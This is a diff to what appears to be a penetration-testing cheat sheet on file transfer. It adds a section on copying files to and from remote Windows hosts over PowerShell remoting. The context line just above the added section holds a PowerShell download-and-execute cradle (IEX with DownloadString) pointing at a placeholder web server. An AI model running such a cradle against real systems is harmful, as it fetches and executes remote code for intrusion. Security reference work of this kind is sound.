@@ -411,6 +411,23 @@ echo IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSE
 New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<SHARE>"; cd LocalMountedFolder:
 ```
 
+###### [Windows] PowerShell remoting / WinRM
+
+Files or folders can be uploaded or downloaded on a remote system through a
+PowerShell remoting session (`WinRM`) using the `Copy-Item` cmdlet:
+
+```
+$s = New-PSSession [-Credential <PSCredential>] -ComputerName <HOSTNAME | IP>
+
+# Downloads the file or folder from the remote computer locally.
+Copy-Item -FromSession $s -Destination "<LOCAL_PATH>" "<REMOTE_FILE_PATH>"
+Copy-Item -FromSession $s -Recurse -Destination "<LOCAL_PATH>" "<REMOTE_FOLDER_PATH>"
+
+# Uploads the file or folder from the local computer to the remote computer.
+Copy-Item -ToSession $s -Destination "<REMOTE_PATH>" "<LOCAL_FILE_PATH>"
+Copy-Item -ToSession $s -Recurse -Destination "<REMOTE_PATH>" "<LOCAL_FOLDER_PATH>"
+```
+
 ###### [Windows] VBScript
 
 `VBScript`, a Microsoft scripting language modeled on Visual Basic, can be used
